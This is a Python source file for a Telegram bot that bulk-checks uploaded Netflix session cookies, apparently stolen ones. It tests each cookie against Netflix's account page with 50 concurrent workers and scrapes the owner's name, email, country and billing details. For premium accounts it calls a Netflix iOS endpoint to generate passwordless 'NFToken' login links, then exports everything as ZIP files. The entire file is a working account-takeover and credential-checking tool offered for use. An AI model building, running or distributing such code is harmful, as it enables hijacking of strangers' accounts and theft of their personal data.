
# bulk_netflix_bot.py - COMPLETE FIXED VERSION
# Netflix Bulk Cookie Checker Bot
# Developer: @iam_esh | Channel: https://t.me/eshinfoo
# All symbols are line emojis only – no colorful emojis

import asyncio
import html
import json
import os
import re
import time
import zipfile
from collections import defaultdict
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional
import threading

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)
from telegram.constants import ParseMode

# ============================================================
#                    CONFIGURATION
# ============================================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
CHANNEL_LINK = "https://t.me/eshinfoo"
DEVELOPER = "@iam_esh"
OWNER = "@iam_esh"
MAX_WORKERS = 50
BATCH_SIZE = 100
REQUEST_TIMEOUT = 15

# ============================================================
#              PREMIUM STYLING SYMBOLS (LINE ONLY)
# ============================================================

S = {
    "star": "✦",
    "spark": "✧",
    "dot": "•",
    "arrow": "➜",
    "double_arrow": "➤",
    "line": "─",
    "double_line": "═",
    "branch": "├",
    "corner": "└",
    "vertical": "│",
    "bullet": "◉",
    "square": "■",
    "diamond": "♦",
    "check": "✓",
    "cross": "✗",
    "warning": "⚠",
    "info": "ℹ",
    "clock": "⏣",
    "target": "⦿",
    "pointer": "⌲",
    "crown": "♔",
    "shield": "⛊",
    "calendar": "📅",          # still monochrome
    "link": "🔗",              # monochrome
    "copyright": "©",
    "rocket": "🚀",            # monochrome
    "fire": "🔥",
    "package": "📦",
    "speed": "⚡",
    "queue": "📋",
    "done": "✅"
}

# ============================================================
#                    FOLDER SETUP
# ============================================================

os.makedirs("temp_cookies", exist_ok=True)
os.makedirs("bot_output", exist_ok=True)
os.makedirs("bulk_results", exist_ok=True)

# ============================================================
#                 USER DATA STORAGE
# ============================================================

user_data = defaultdict(lambda: {
    "total": 0,
    "valid": 0,
    "invalid": 0,
    "free": 0,
    "premium": 0,
    "last_check": None,
    "redeem_count": 0,
    "last_redeem": None,
})

active_batches = {}
batch_lock = threading.Lock()

# ============================================================
#                 NFTOKEN API CONFIG
# ============================================================

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false"}',
    "device_type": "NFAPPL-02-",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "accept-language": "en-US;q=1",
}

# ============================================================
#                COOKIE CONSTANTS
# ============================================================

REQUIRED_COOKIES = {"NetflixId"}
ALL_COOKIES = REQUIRED_COOKIES | {"SecureNetflixId", "nfvdid"}

# ============================================================
#                 HELPER FUNCTIONS
# ============================================================

def decode_value(value):
    if not value:
        return None
    cleaned = html.unescape(str(value))
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"')
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return cleaned or None
  # ============================================================
#              COOKIE EXTRACTION
# ============================================================

def extract_cookie_bundles(content: str) -> List[Dict]:
    bundles = []
    # JSON
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    cookies = {}
                    for cn in ALL_COOKIES:
                        val = item.get(cn) or item.get(cn.lower())
                        if val:
                            cookies[cn] = val
                    if cookies.get("NetflixId"):
                        bundles.append({"cookies": cookies, "raw": json.dumps(item)})
        elif isinstance(data, dict):
            cookies = {}
            for cn in ALL_COOKIES:
                val = data.get(cn) or data.get(cn.lower())
                if val:
                    cookies[cn] = val
            if cookies.get("NetflixId"):
                bundles.append({"cookies": cookies, "raw": json.dumps(data)})
    except:
        pass

    # Netscape
    if not bundles:
        current = {}
        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split("\t")
            if len(parts) >= 7:
                name = parts[5].lower()
                if name in {c.lower() for c in ALL_COOKIES}:
                    current[name.capitalize()] = parts[6]
                    if name == "netflixid" and current.get("NetflixId"):
                        bundles.append({"cookies": current.copy(), "raw": line})
                        current = {}

    # Raw text
    if not bundles:
        for line in content.splitlines():
            cookies = {}
            for cn in ALL_COOKIES:
                pattern = rf'{cn}[\s]*=[\s]*"?([^";\s]+)"?'
                m = re.search(pattern, line, re.IGNORECASE)
                if m:
                    cookies[cn] = m.group(1)
            if cookies.get("NetflixId"):
                bundles.append({"cookies": cookies, "raw": line})

    return bundles

def validate_cookies(cookies: Dict) -> bool:
    return bool(cookies and cookies.get("NetflixId"))

# ============================================================
#                 NFTOKEN GENERATION
# ============================================================

def create_nftoken(cookies: Dict) -> Optional[Dict]:
    netflix_id = decode_value(cookies.get("NetflixId"))
    if not netflix_id:
        return None
    headers = NFTOKEN_HEADERS.copy()
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        resp = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS,
                           headers=headers, timeout=15, verify=False)
        if resp.status_code == 200:
            data = resp.json()
            token_data = data.get("value", {}).get("account", {}).get("token", {}).get("default", {})
            token = decode_value(token_data.get("token"))
            if token:
                return {"token": token, "expires": token_data.get("expires")}
    except:
        pass
    return None

def get_nftoken_expiry(expires) -> str:
    if expires:
        try:
            ts = int(expires)
            if len(str(ts)) == 13:
                ts //= 1000
            return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
        except:
            pass
    return (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")
  # ============================================================
#              ACCOUNT INFO EXTRACTION
# ============================================================

def extract_account_info(response_text: str) -> Dict:
    info = {}
    patterns = {
        "owner": [r'"name"\s*:\s*"([^"]+)"', r'"accountOwnerName"\s*:\s*"([^"]+)"'],
        "email": [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"'],
        "country": [r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup":\s*"([^"]+)"'],
        "member_since": [r'"memberSince":\s*"([^"]+)"'],
        "next_billing": [r'"nextBillingDate"\s*:\s*"([^"]+)"'],
        "plan": [r'"localizedPlanName"\s*:\s*"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"'],
        "streams": [r'"maxStreams"\s*:\s*"?([^",}]+)"?'],
        "quality": [r'"videoQuality"\s*:\s*"([^"]+)"'],
        "status": [r'"membershipStatus"\s*:\s*"([^"]+)"'],
    }
    for key, pats in patterns.items():
        for pat in pats:
            m = re.search(pat, response_text, re.IGNORECASE)
            if m:
                info[key] = decode_value(m.group(1))
                break
    profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', response_text)
    if profiles:
        info["profiles"] = ", ".join(set(profiles[:3]))
    info["on_hold"] = "Yes" if re.search(r'"isUserOnHold"\s*:\s*true', response_text, re.IGNORECASE) else "No"
    return info

def check_single_cookie(cookies: Dict) -> Dict:
    session = requests.Session()
    session.cookies.update(cookies)
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"}
    result = {"valid": False, "premium": False, "info": None, "nftoken": None, "error": None}
    try:
        resp = session.get("https://www.netflix.com/account/membership", headers=headers, timeout=REQUEST_TIMEOUT)
        if resp.status_code == 200:
            info = extract_account_info(resp.text)
            if info.get("country"):
                result["valid"] = True
                result["info"] = info
                if "premium" in info.get("plan", "").lower():
                    result["premium"] = True
                    result["nftoken"] = create_nftoken(cookies)
    except Exception as e:
        result["error"] = str(e)[:100]
    finally:
        session.close()
    return result

def check_cookies_batch(cookies_list: List[Dict], progress_callback=None) -> List[Dict]:
    results = []
    total = len(cookies_list)
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_to_idx = {executor.submit(check_single_cookie, c): i for i, c in enumerate(cookies_list)}
        for future in as_completed(future_to_idx):
            idx = future_to_idx[future]
            try:
                res = future.result(timeout=30)
                results.append({"index": idx, "cookies": cookies_list[idx], "result": res})
            except Exception as e:
                results.append({"index": idx, "cookies": cookies_list[idx], "result": {"valid": False, "error": str(e)}})
            if progress_callback:
                progress_callback(len(results), total)
    results.sort(key=lambda x: x["index"])
    return results
  # ============================================================
#              TELEGRAM BOT HANDLERS (HTML MODE)
# ============================================================

def chat_target(update: Update):
    """Return a chat target that can reply (message or callback query)"""
    if update and update.effective_message:
        return update.effective_message
    if update and update.callback_query and update.callback_query.message:
        return update.callback_query.message
    return None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = chat_target(update)
    if not target:
        return
    user = update.effective_user
    text = f"""
{S['double_line'] * 48}
{S['star']}{S['star']}{S['star']} <b>BULK NETFLIX CHECKER</b> {S['star']}{S['star']}{S['star']}
{S['shield']} <b>Welcome {user.first_name}!</b> {S['shield']}

{S['rocket']} <b>Premium Features:</b> {S['rocket']}

{S['bullet']} {S['package']} <b>Bulk Checking</b> - 1000+ cookies at once
{S['bullet']} {S['speed']} <b>50x Concurrent</b> - Lightning fast checks
{S['bullet']} {S['fire']} <b>Premium Detection</b> - Auto NFToken links
{S['bullet']} {S['link']} <b>One-Click Login</b> - No password needed
{S['bullet']} {S['done']} <b>Auto Export</b> - ZIP with all results

{S['branch']}── {S['target']} <b>Quick Commands</b> ──{S['branch']}

{S['pointer']} <code>/start</code> - Launch bot
{S['pointer']} <code>/help</code> - Show all commands
{S['pointer']} <code>/stats</code> - Your statistics
{S['pointer']} <code>/batch</code> - Check batch status
{S['pointer']} <code>/export</code> - Download results

{S['branch']}── {S['target']} <b>How to Use</b> ──{S['branch']}

{S['bullet']} 1. Export cookies (Netscape/JSON format)
{S['bullet']} 2. Send .txt, .json, or .zip file
{S['bullet']} 3. Click START BATCH button
{S['bullet']} 4. Watch live progress bar
{S['bullet']} 5. Download results with /export

{S['double_line'] * 48}
{S['copyright']} <b>{DEVELOPER}</b> | {S['link']} <b>{CHANNEL_LINK}</b>
{S['spark']} <i>Powered by Advanced Bulk Checker</i> {S['spark']}
"""
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(f"{S['package']} BATCH STATUS {S['package']}", callback_data="batch"),
         InlineKeyboardButton(f"{S['star']} MY STATS {S['star']}", callback_data="stats")],
        [InlineKeyboardButton(f"{S['link']} JOIN CHANNEL {S['link']}", url=CHANNEL_LINK),
         InlineKeyboardButton(f"{S['crown']} DEVELOPER {S['crown']}", url=f"https://t.me/{DEVELOPER[1:]}")]
    ])
    await target.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=keyboard)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = chat_target(update)
    if not target:
        return
    text = f"""
{S['double_line'] * 48}
{S['star']} <b>COMMAND LIST</b> {S['star']}
{S['double_line'] * 48}

{S['branch']}── {S['target']} <b>Basic Commands</b>

{S['pointer']} <code>/start</code> - Launch the bot
{S['pointer']} <code>/help</code> - Show this menu
{S['pointer']} <code>/stats</code> - View your statistics
{S['pointer']} <code>/batch</code> - Check batch status
{S['pointer']} <code>/export</code> - Download results

{S['branch']}── {S['target']} <b>File Formats Supported</b>

{S['bullet']} <code>.txt</code> - Netscape cookie format
{S['bullet']} <code>.json</code> - Browser extension export
{S['bullet']} <code>.zip</code> - Multiple cookie files (1000+)

{S['branch']}── {S['target']} <b>Premium Features</b>

{S['check']} NFToken login links (no password)
{S['check']} Real-time progress tracking
{S['check']} Country flags & plan details
{S['check']} Auto ZIP export with results
{S['check']} Premium account detection

{S['double_line'] * 48}
{S['copyright']} {DEVELOPER} | {S['link']} {CHANNEL_LINK}
"""
    await target.reply_text(text, parse_mode=ParseMode.HTML)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = chat_target(update)
    if not target:
        return
    uid = update.effective_user.id
    data = user_data[uid]
    success = (data['valid'] / data['total'] * 100) if data['total'] > 0 else 0
    text = f"""
{S['double_line'] * 48}
{S['star']} <b>YOUR STATISTICS</b> {S['star']}
{S['double_line'] * 48}
{S['vertical']} <b>User:</b> {update.effective_user.first_name}
{S['vertical']} <b>ID:</b> <code>{uid}</code>

{S['branch']}── {S['target']} <b>Bulk Check History</b>

{S['package']} Total Cookies: <code>{data['total']:,}</code>
{S['check']} Valid Accounts: <code>{data['valid']:,}</code>
{S['star']} Premium: <code>{data['premium']:,}</code>
{S['spark']} Free: <code>{data['free']:,}</code>
{S['cross']} Invalid: <code>{data['invalid']:,}</code>

{S['branch']}── {S['target']} <b>Performance</b>

{S['speed']} Success Rate: <code>{success:.1f}%</code>
{S['clock']} Last Check: <code>{data['last_check'] or 'Never'}</code>

{S['double_line'] * 48}
{S['copyright']} {DEVELOPER} | {S['link']} {CHANNEL_LINK}
"""
    await target.reply_text(text, parse_mode=ParseMode.HTML)
  # ============================================================
#              FILE HANDLER & BATCH PROCESSING
# ============================================================

async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = chat_target(update)
    if not target:
        return
    uid = update.effective_user.id
    doc = update.message.document
    fname = doc.file_name
    if uid in active_batches:
        await target.reply_text(f"{S['warning']} <b>Batch Already Running</b>\n\n{S['clock']} Please wait!", parse_mode=ParseMode.HTML)
        return
    if not fname.lower().endswith(('.txt','.json','.zip')):
        await target.reply_text(f"{S['cross']} <b>Unsupported Format</b>\n\nSend .txt, .json, or .zip", parse_mode=ParseMode.HTML)
        return
    status = await target.reply_text(f"{S['rocket']} <b>DOWNLOADING</b> <code>{fname}</code>...\n\n{S['square']*20}\n0%", parse_mode=ParseMode.HTML)
    try:
        file = await context.bot.get_file(doc.file_id)
        temp_path = f"temp_cookies/{uid}_{fname}"
        await file.download_to_drive(temp_path)
        await status.edit_text(f"{S['package']} <b>EXTRACTING COOKIES</b>...\n\n{S['square']*5}{'░'*15}\n25%", parse_mode=ParseMode.HTML)
        all_bundles = []
        if fname.lower().endswith('.zip'):
            with zipfile.ZipFile(temp_path, 'r') as zf:
                for zname in zf.namelist():
                    if zname.endswith(('.txt','.json')):
                        with zf.open(zname) as f:
                            cnt = f.read().decode('utf-8', errors='ignore')
                            bundles = extract_cookie_bundles(cnt)
                            for b in bundles:
                                b['source_file'] = zname
                            all_bundles.extend(bundles)
        else:
            with open(temp_path, 'r', encoding='utf-8', errors='ignore') as f:
                cnt = f.read()
            all_bundles = extract_cookie_bundles(cnt)
        os.remove(temp_path)
        if not all_bundles:
            await status.delete()
            await target.reply_text(f"{S['cross']} <b>No Valid Cookies Found</b>\n\nNo NetflixId detected.", parse_mode=ParseMode.HTML)
            return
        total = len(all_bundles)
        est = total // MAX_WORKERS + 1
        await status.delete()
        keyboard = InlineKeyboardMarkup([[
            InlineKeyboardButton(f"{S['check']} START BATCH {S['check']}", callback_data=f"confirm_{uid}"),
            InlineKeyboardButton(f"{S['cross']} CANCEL {S['cross']}", callback_data=f"cancel_{uid}")
        ]])
        await target.reply_text(
            f"{S['package']} <b>Batch Ready</b>\n\n{S['double_line']*35}\n"
            f"{S['pointer']} Cookies Found: <code>{total:,}</code>\n"
            f"{S['speed']} Concurrent Checks: <code>{MAX_WORKERS}</code>\n"
            f"{S['clock']} Est. Time: <code>{est}</code> minutes\n\n"
            f"{S['warning']} Click START to begin!",
            parse_mode=ParseMode.HTML, reply_markup=keyboard
        )
        context.user_data['pending_batch'] = {'bundles': all_bundles, 'total': total}
    except Exception as e:
        await status.edit_text(f"{S['cross']} <b>Error</b>\n<code>{str(e)[:100]}</code>", parse_mode=ParseMode.HTML)

async def process_batch(update: Update, context: ContextTypes.DEFAULT_TYPE, uid: int, bundles: List[Dict]):
    target = chat_target(update)
    if not target or uid in active_batches:
        return
    active_batches[uid] = {
        'total': len(bundles), 'completed': 0, 'valid': 0, 'premium': 0, 'free': 0, 'invalid': 0,
        'results': [], 'start_time': time.time()
    }
    progress = await target.reply_text(
        f"{S['fire']} <b>BATCH PROCESSING</b> {S['fire']}\n\n{S['package']} Total: <code>{len(bundles):,}</code>\n"
        f"{S['speed']} Speed: <code>{MAX_WORKERS}</code> concurrent\n{S['square']*20}\n0%", parse_mode=ParseMode.HTML)
    all_results = []
    chunk_sz = BATCH_SIZE
    for start_idx in range(0, len(bundles), chunk_sz):
        end_idx = min(start_idx+chunk_sz, len(bundles))
        chunk = bundles[start_idx:end_idx]
        percent = (start_idx / len(bundles)) * 100
        filled = int(20 * start_idx / len(bundles))
        bar = f"{S['square']*filled}{'░'*(20-filled)}"
        await progress.edit_text(
            f"{S['fire']} <b>BATCH PROCESSING</b> {S['fire']}\n\n"
            f"{S['package']} Progress: <code>{start_idx:,}/{len(bundles):,}</code>\n"
            f"{S['check']} Valid: <code>{active_batches[uid]['valid']:,}</code>\n"
            f"{S['star']} Premium: <code>{active_batches[uid]['premium']:,}</code>\n"
            f"{S['spark']} Free: <code>{active_batches[uid]['free']:,}</code>\n"
            f"{S['cross']} Invalid: <code>{active_batches[uid]['invalid']:,}</code>\n"
            f"{bar}\n<code>{percent:.1f}%</code>\n\n"
            f"{S['clock']} Elapsed: <code>{int(time.time()-active_batches[uid]['start_time'])}</code>s",
            parse_mode=ParseMode.HTML)
        chunk_res = await asyncio.get_event_loop().run_in_executor(None, check_cookies_batch, chunk, None)
        for r in chunk_res:
            res = r['result']
            if res['valid']:
                active_batches[uid]['valid'] += 1
                if res['premium']:
                    active_batches[uid]['premium'] += 1
                else:
                    active_batches[uid]['free'] += 1
            else:
                active_batches[uid]['invalid'] += 1
            all_results.append(r)
        active_batches[uid]['completed'] = end_idx
        active_batches[uid]['results'] = all_results
    # complete
    elapsed = int(time.time() - active_batches[uid]['start_time'])
    v = active_batches[uid]['valid']
    p = active_batches[uid]['premium']
    f = active_batches[uid]['free']
    i = active_batches[uid]['invalid']
    success = (v/len(bundles)*100) if len(bundles) else 0
    # generate result files
    result_files = await generate_result_files(uid, all_results, active_batches[uid])
    await progress.edit_text(
        f"{S['done']} <b>BATCH COMPLETE</b> {S['done']}\n\n{S['double_line']*35}\n"
        f"{S['package']} Total: <code>{len(bundles):,}</code>\n"
        f"{S['check']} Valid: <code>{v:,}</code>\n"
        f"{S['star']} Premium: <code>{p:,}</code>\n"
        f"{S['spark']} Free: <code>{f:,}</code>\n"
        f"{S['cross']} Invalid: <code>{i:,}</code>\n\n"
        f"{S['speed']} Success Rate: <code>{success:.1f}%</code>\n"
        f"{S['clock']} Time: <code>{elapsed//60}m {elapsed%60}s</code>\n\n"
        f"{S['link']} Results saved! Use /export",
        parse_mode=ParseMode.HTML)
    # premium summary
    premium_acc = [r for r in all_results if r['result'].get('premium')]
    if premium_acc:
        summ = f"{S['star']} <b>PREMIUM ACCOUNTS FOUND</b> {S['star']}\n\n"
        for i, acc in enumerate(premium_acc[:10]):
            info = acc['result']['info']
            email = info.get('email', 'N/A')
            country = info.get('country', 'N/A')
            summ += f"{S['pointer']} <code>{email}</code> | {country}\n"
        if len(premium_acc) > 10:
            summ += f"\n{S['dot']} +{len(premium_acc)-10} more"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(f"{S['link']} EXPORT RESULTS {S['link']}", callback_data="export")]])
        await target.reply_text(summ, parse_mode=ParseMode.HTML, reply_markup=keyboard)
    # update user stats
    user_data[uid]['total'] += len(bundles)
    user_data[uid]['valid'] += v
    user_data[uid]['premium'] += p
    user_data[uid]['free'] += f
    user_data[uid]['invalid'] += i
    user_data[uid]['last_check'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    del active_batches[uid]
  async def generate_result_files(uid: int, results: List[Dict], batch_data: Dict) -> Dict:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    base = f"bulk_results/{uid}_{ts}"
    os.makedirs(base, exist_ok=True)
    premium_lines, free_lines, invalid_lines = [], [], []
    for r in results:
        res = r['result']
        cookies = r['cookies']
        if res.get('premium'):
            info = res['info']
            nft = res.get('nftoken')
            line = f"{S['double_line']*40}\n✨ PREMIUM ACCOUNT ✨\n{S['double_line']*40}\n"
            line += f"📧 Email: {info.get('email','N/A')}\n👤 Owner: {info.get('owner','N/A')}\n"
            line += f"🌍 Country: {info.get('country','N/A')}\n📦 Plan: {info.get('plan','PREMIUM')}\n"
            line += f"📺 Quality: {info.get('quality','N/A')}\n📱 Streams: {info.get('streams','N/A')}\n"
            line += f"⏸️ On Hold: {info.get('on_hold','No')}\n✅ Email Verified: {info.get('email_verified','No')}\n"
            line += f"📅 Member Since: {info.get('member_since','N/A')}\n🗓️ Next Billing: {info.get('next_billing','N/A')}\n"
            line += f"🎭 Profiles: {info.get('profiles','N/A')}\n\n"
            if nft:
                line += f"{S['link']} NFToken Login Links\n"
                line += f"🖥️ PC: https://www.netflix.com/login?nftoken={nft['token']}\n"
                line += f"📱 Mobile: https://www.netflix.com/unsupported?nftoken={nft['token']}\n"
                line += f"⏣ Expires: {get_nftoken_expiry(nft.get('expires'))}\n\n"
            line += f"🍪 Cookies:\n{json.dumps(cookies, indent=2)}\n{S['line']*50}\n\n"
            premium_lines.append(line)
        elif res.get('valid'):
            info = res['info']
            line = f"{S['line']*40}\n📧 Email: {info.get('email','N/A')}\n👤 Owner: {info.get('owner','N/A')}\n"
            line += f"🌍 Country: {info.get('country','N/A')}\n📦 Plan: {info.get('plan','FREE/STANDARD')}\n"
            line += f"📺 Quality: {info.get('quality','N/A')}\n📱 Streams: {info.get('streams','N/A')}\n"
            line += f"🎭 Profiles: {info.get('profiles','N/A')}\n\n🍪 Cookies:\n{json.dumps(cookies, indent=2)}\n{S['line']*40}\n\n"
            free_lines.append(line)
        else:
            invalid_lines.append(f"{S['cross']} Invalid Cookie\n🍪 Cookies: {json.dumps(cookies)}\n⚠️ Error: {res.get('error','Invalid/Expired')}\n{S['line']*40}\n\n")
    with open(f"{base}/premium_accounts.txt", 'w', encoding='utf-8') as f:
        f.writelines(premium_lines) if premium_lines else f.write("No premium accounts\n")
    with open(f"{base}/free_accounts.txt", 'w', encoding='utf-8') as f:
        f.writelines(free_lines) if free_lines else f.write("No free accounts\n")
    with open(f"{base}/invalid_accounts.txt", 'w', encoding='utf-8') as f:
        f.writelines(invalid_lines) if invalid_lines else f.write("No invalid accounts\n")
    summary = f"{S['double_line']*48}\nBATCH SUMMARY\n{S['double_line']*48}\n"
    summary += f"Date: {datetime.now()}\nUser: {uid}\nTotal: {batch_data['total']}\nValid: {batch_data['valid']}\n"
    summary += f"Premium: {batch_data['premium']}\nFree: {batch_data['free']}\nInvalid: {batch_data['invalid']}\n"
    summary += f"Success Rate: {(batch_data['valid']/batch_data['total']*100):.1f}%\n"
    with open(f"{base}/summary.txt", 'w', encoding='utf-8') as f:
        f.write(summary)
    zip_path = f"{base}.zip"
    with zipfile.ZipFile(zip_path, 'w') as zf:
        zf.write(f"{base}/premium_accounts.txt", "premium_accounts.txt")
        zf.write(f"{base}/free_accounts.txt", "free_accounts.txt")
        zf.write(f"{base}/invalid_accounts.txt", "invalid_accounts.txt")
        zf.write(f"{base}/summary.txt", "summary.txt")
    return {'zip': zip_path}
  # ============================================================
#              STATUS, EXPORT, BUTTON CALLBACK
# ============================================================

async def batch_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = chat_target(update)
    if not target:
        return
    uid = update.effective_user.id
    if uid in active_batches:
        b = active_batches[uid]
        elapsed = int(time.time() - b['start_time'])
        percent = (b['completed']/b['total']*100) if b['total'] else 0
        filled = int(20 * b['completed'] / b['total']) if b['total'] else 0
        bar = f"{S['square']*filled}{'░'*(20-filled)}"
        text = f"{S['fire']} <b>BATCH STATUS</b> {S['fire']}\n{S['double_line']*35}\n"
        text += f"{S['package']} Progress: <code>{b['completed']:,}/{b['total']:,}</code>\n{bar}\n<code>{percent:.1f}%</code>\n"
        text += f"{S['check']} Valid: <code>{b['valid']:,}</code>\n{S['star']} Premium: <code>{b['premium']:,}</code>\n"
        text += f"{S['spark']} Free: <code>{b['free']:,}</code>\n{S['cross']} Invalid: <code>{b['invalid']:,}</code>\n"
        text += f"{S['clock']} Elapsed: <code>{elapsed//60}m {elapsed%60}s</code>\n"
        text += f"{S['speed']} Speed: <code>{b['completed']//max(elapsed,1)}</code> cookies/min"
        await target.reply_text(text, parse_mode=ParseMode.HTML)
    else:
        await target.reply_text(f"{S['info']} <b>No Active Batch</b>\n\nSend a cookie file to start.", parse_mode=ParseMode.HTML)

async def export_results(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = chat_target(update)
    if not target:
        return
    uid = update.effective_user.id
    if not os.path.exists("bulk_results"):
        await target.reply_text(f"{S['cross']} No results yet.", parse_mode=ParseMode.HTML)
        return
    dirs = [d for d in os.listdir("bulk_results") if d.startswith(str(uid)) and os.path.isdir(os.path.join("bulk_results", d))]
    if not dirs:
        await target.reply_text(f"{S['cross']} No results found.", parse_mode=ParseMode.HTML)
        return
    latest = sorted(dirs)[-1]
    zip_path = f"bulk_results/{latest}.zip"
    if os.path.exists(zip_path):
        with open(zip_path, 'rb') as f:
            await target.reply_document(document=f, filename=f"netflix_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip",
                                        caption=f"{S['package']} Batch Results\n{S['copyright']} {DEVELOPER}",
                                        parse_mode=ParseMode.HTML)
    else:
        await target.reply_text(f"{S['cross']} File missing.", parse_mode=ParseMode.HTML)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data.startswith("confirm_"):
        uid = int(data.split("_")[1])
        if 'pending_batch' in context.user_data:
            batch = context.user_data.pop('pending_batch')
            await process_batch(update, context, uid, batch['bundles'])
    elif data.startswith("cancel_"):
        context.user_data.pop('pending_batch', None)
        await query.edit_message_text(f"{S['cross']} Batch Cancelled", parse_mode=ParseMode.HTML)
    elif data == "batch":
        await batch_status(update, context)
    elif data == "stats":
        await stats_command(update, context)
    elif data == "export":
        await export_results(update, context)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    import traceback
    error = context.error
    etype = type(error).__name__
    msg = str(error)
    print(f"\n{'='*50}\nERROR: {etype}\n{msg}\n{traceback.format_exc()}\n{'='*50}")
    target = chat_target(update)
    if target:
        try:
            await target.reply_text(
                f"{S['cross']} <b>Error</b>: <code>{etype}: {msg[:200]}</code>\nCheck logs.",
                parse_mode=ParseMode.HTML
            )
        except:
            pass

def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Set BOT_TOKEN environment variable")
        return
    print(f"\n{S['double_line']*48}\n{S['star']} BULK NETFLIX CHECKER {S['star']}\n{S['double_line']*48}\nStarting...")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("batch", batch_status))
    app.add_handler(CommandHandler("export", export_results))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_bulk_file))
    app.add_error_handler(error_handler)
    print("Bot is running. Press Ctrl+C to stop.")
    app.run_polling(allowed_updates=[Update.MESSAGE, Update.CALLBACK_QUERY])

if __name__ == "__main__":
    main()
